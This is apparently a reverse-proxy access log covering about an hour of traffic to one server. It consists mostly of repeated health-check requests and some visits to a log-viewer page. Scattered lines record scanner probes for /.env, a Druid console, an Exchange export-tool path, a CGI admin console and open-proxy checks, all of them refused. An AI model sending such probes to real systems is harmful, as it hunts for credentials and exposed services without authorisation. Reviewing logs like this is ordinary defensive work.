159.203.109.206 - - [20/Dec/2023:13:11:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1679 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:11:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1680 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:13:12:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1681 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:12:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1682 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:13:13:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1683 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:13:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1684 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:13:14:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1685 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:14:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1686 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:13:15:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1687 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:13:15:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1688 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:13:16:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1689 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:16:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1690 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:13:17:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1691 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:17:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1692 "www@docker" "http://172.20.0.9:80" 0ms
143.110.222.166 - - [20/Dec/2023:13:17:40 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1693 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:13:18:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1694 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:13:18:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1695 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:13:19:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1696 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:19:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1697 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:13:20:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1698 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:20:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1699 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:13:21:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1700 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:21:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1701 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:13:22:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1702 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:22:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1703 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:13:23:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1704 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:23:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1705 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:13:24:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1706 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:24:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1707 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:13:25:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1708 "www@docker" "http://172.20.0.9:80" 0ms
162.243.137.27 - - [20/Dec/2023:13:25:21 +0000] "GET /druid/index.html HTTP/1.1" 301 17 "-" "-" 1709 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [20/Dec/2023:13:25:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1710 "www@docker" "http://172.20.0.9:80" 2ms
159.203.109.206 - - [20/Dec/2023:13:26:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1711 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:13:26:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1712 "www@docker" "http://172.20.0.9:80" 1ms
162.243.146.71 - - [20/Dec/2023:13:27:08 +0000] "GET /druid/index.html HTTP/1.1" 301 17 "-" "-" 1713 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:13:27:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1714 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:27:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1715 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:13:28:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1716 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:28:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1717 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:13:29:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1718 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:29:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1719 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:13:30:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1720 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:30:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1721 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:13:31:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1722 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:13:31:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1723 "www@docker" "http://172.20.0.9:80" 0ms
192.241.235.31 - - [20/Dec/2023:13:32:15 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1724 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:13:32:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1725 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:32:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1726 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:13:33:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1727 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:33:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1728 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:13:34:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1729 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:34:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1730 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:13:35:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1731 "www@docker" "http://172.20.0.9:80" 1ms
198.199.117.129 - - [20/Dec/2023:13:35:29 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1732 "-" "-" 0ms
167.71.120.76 - - [20/Dec/2023:13:35:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1733 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:13:36:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1734 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:36:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1735 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:13:37:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1736 "www@docker" "http://172.20.0.9:80" 0ms
45.79.168.172 - - [20/Dec/2023:13:37:24 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1737 "-" "-" 0ms
167.71.120.76 - - [20/Dec/2023:13:37:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1738 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:13:38:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1739 "www@docker" "http://172.20.0.9:80" 0ms
45.79.181.223 - - [20/Dec/2023:13:38:32 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1740 "-" "-" 0ms
167.71.120.76 - - [20/Dec/2023:13:38:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1741 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:13:39:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1742 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:39:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1743 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:13:40:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1744 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:40:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1745 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:13:41:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1746 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:41:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1747 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:13:42:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1748 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:42:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1749 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:13:43:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1750 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:43:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1751 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:13:44:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1752 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:44:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1753 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:13:45:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1754 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:45:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1755 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:13:46:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1756 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:46:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1757 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:13:47:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1758 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:47:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1759 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:13:48:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1760 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:48:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1761 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:13:49:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1762 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:49:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1763 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:13:50:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1764 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:50:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1765 "www@docker" "http://172.20.0.9:80" 0ms
178.128.84.187 - - [20/Dec/2023:13:51:02 +0000] "GET /aaa9 HTTP/1.1" 404 19 "-" "-" 1766 "-" "-" 0ms
178.128.84.187 - - [20/Dec/2023:13:51:02 +0000] "GET /aab8 HTTP/1.1" 404 19 "-" "-" 1767 "-" "-" 0ms
178.128.84.187 - - [20/Dec/2023:13:51:03 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1768 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:13:51:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1769 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:51:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1770 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:13:52:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1771 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:13:52:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1772 "www@docker" "http://172.20.0.9:80" 0ms
45.33.87.154 - - [20/Dec/2023:13:53:11 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1773 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:13:53:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1774 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:53:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1775 "www@docker" "http://172.20.0.9:80" 1ms
172.104.11.51 - - [20/Dec/2023:13:53:34 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1776 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:13:54:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1777 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:54:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1778 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:13:55:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1779 "www@docker" "http://172.20.0.9:80" 0ms
57.129.23.166 - - [20/Dec/2023:13:55:31 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1780 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [20/Dec/2023:13:55:31 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1781 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [20/Dec/2023:13:55:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1782 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:13:56:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1783 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:56:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1784 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:13:57:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1785 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:13:57:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1786 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:13:58:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1787 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:58:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1788 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:13:59:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1789 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:13:59:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1790 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:14:00:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1791 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:00:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1792 "www@docker" "http://172.20.0.9:80" 1ms
90.151.171.106 - - [20/Dec/2023:14:00:43 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 1793 "web-to-websecure@internal" "-" 0ms
90.151.171.106 - - [20/Dec/2023:14:00:54 +0000] "GET /ip?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 1794 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:14:01:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1795 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:14:01:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1796 "www@docker" "http://172.20.0.9:80" 1ms
143.110.222.166 - - [20/Dec/2023:14:01:59 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1797 "web-to-websecure@internal" "-" 0ms
143.110.222.166 - - [20/Dec/2023:14:02:08 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1798 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:14:02:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1799 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:02:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1800 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:14:03:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1801 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:03:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1802 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:14:04:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1803 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:04:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1804 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:14:05:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1805 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:14:05:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1806 "www@docker" "http://172.20.0.9:80" 0ms
185.224.128.191 - - [20/Dec/2023:14:05:36 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1807 "web-to-websecure@internal" "-" 0ms
162.243.147.4 - - [20/Dec/2023:14:06:05 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 19 "-" "-" 1808 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:14:06:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1809 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:06:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1810 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:14:07:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1811 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:07:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1812 "www@docker" "http://172.20.0.9:80" 0ms
185.224.128.191 - - [20/Dec/2023:14:07:35 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1813 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:14:08:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1814 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:08:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1815 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:14:09:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1816 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:14:09:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1817 "www@docker" "http://172.20.0.9:80" 1ms
165.154.138.85 - - [20/Dec/2023:14:09:40 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1818 "-" "-" 0ms
165.154.138.85 - - [20/Dec/2023:14:10:02 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 1819 "-" "-" 0ms
165.154.138.85 - - [20/Dec/2023:14:10:05 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 1820 "-" "-" 0ms
165.154.138.85 - - [20/Dec/2023:14:10:08 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 1821 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:14:10:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1822 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:10:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1823 "www@docker" "http://172.20.0.9:80" 1ms
165.154.138.85 - - [20/Dec/2023:14:11:14 +0000] "GET /cgi-bin/admin_console.cgi HTTP/1.1" 404 19 "-" "-" 1824 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:14:11:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1825 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:11:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1826 "www@docker" "http://172.20.0.9:80" 0ms
162.142.125.11 - - [20/Dec/2023:14:11:39 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1827 "-" "-" 0ms
162.142.125.11 - - [20/Dec/2023:14:11:43 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1828 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:14:12:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1829 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:12:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1830 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:14:13:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1831 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:13:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1832 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:14:14:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1833 "www@docker" "http://172.20.0.9:80" 46ms
54.36.115.221 - - [20/Dec/2023:14:14:24 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1834 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [20/Dec/2023:14:14:24 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1835 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [20/Dec/2023:14:14:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1836 "www@docker" "http://172.20.0.9:80" 18ms
159.203.109.206 - - [20/Dec/2023:14:15:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1837 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:15:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1838 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:14:16:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1839 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:14:16:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1840 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:14:17:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1841 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:17:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1842 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:14:18:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1843 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:18:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1844 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:14:19:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1845 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:19:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1846 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:14:20:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1847 "www@docker" "http://172.20.0.9:80" 1ms
129.55.200.20 - - [20/Dec/2023:14:20:27 +0000] "GET /logs HTTP/2.0" 404 548 "-" "-" 1848 "logpager@docker" "http://172.20.0.3:80" 37ms
129.55.200.20 - - [20/Dec/2023:14:20:27 +0000] "GET /favicon.ico HTTP/2.0" 404 555 "-" "-" 1849 "www@docker" "http://172.20.0.9:80" 19ms
129.55.200.20 - - [20/Dec/2023:14:20:31 +0000] "GET /logs/ HTTP/2.0" 200 2476 "-" "-" 1850 "logpager@docker" "http://172.20.0.3:80" 2ms
129.55.200.20 - - [20/Dec/2023:14:20:31 +0000] "GET /logs/styles.css?version=16 HTTP/2.0" 200 1864 "-" "-" 1851 "logpager@docker" "http://172.20.0.3:80" 1ms
129.55.200.20 - - [20/Dec/2023:14:20:31 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1989 "-" "-" 1852 "logpager@docker" "http://172.20.0.3:80" 34ms
167.71.120.76 - - [20/Dec/2023:14:20:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1853 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:14:21:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1854 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:14:21:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1855 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:14:22:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1856 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:22:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1857 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:14:23:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1858 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:23:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1859 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:14:24:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1860 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:14:24:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1861 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:14:25:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1862 "www@docker" "http://172.20.0.9:80" 0ms
